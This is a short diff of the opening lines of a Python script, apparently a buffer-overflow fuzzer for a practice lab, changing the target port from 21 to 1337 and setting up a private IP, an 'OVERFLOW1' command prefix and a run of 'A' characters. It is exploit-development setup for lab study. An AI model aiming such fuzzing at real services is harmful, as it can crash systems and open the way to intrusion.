@@ -1,7 +1,7 @@
 #!/usr/bin/env python3 
 import sys,time,socket
 ip = "192.168.144.130"  #Change This
-port = 21  #Change This
+port = 1337  #Change This
 timeout = 5
 prefix = "OVERFLOW1 "  #Change This
 string = prefix + "A"*100
